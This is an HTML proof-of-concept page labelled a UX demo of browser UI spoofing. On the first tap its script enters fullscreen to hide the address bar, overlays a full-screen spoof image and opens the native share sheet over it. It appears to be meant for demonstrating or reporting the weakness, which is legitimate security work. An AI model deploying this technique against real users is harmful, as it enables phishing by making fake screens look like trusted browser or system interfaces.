<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof – UX Demo</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #fff;
      font-family: sans-serif;
      height: 200vh;
    }

    #spoof {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
      pointer-events: none;
    }

    #content {
      padding-top: 120px;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spoof.png">

<div id="content">
  <h1>Tap anywhere to trigger UI spoof demo</h1>
</div>

<script>
document.addEventListener('click', async () => {

  /* 1️⃣ Enter fullscreen → omnibar hides */
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
    } catch (e) {}
  }

  /* 2️⃣ Show spoof image */
  document.getElementById("spoof").style.display = "block";
  document.getElementById("content").style.display = "none";

  /* 3️⃣ Trusted system UI (safer than Contacts API) */
  if (navigator.share) {
    navigator.share({
      title: 'UX Research Demo',
      text: 'Trusted system UI takes focus',
      url: location.href
    }).catch(()=>{});
  }

}, { once: true }); // only first tap
</script>

</body>
</html>
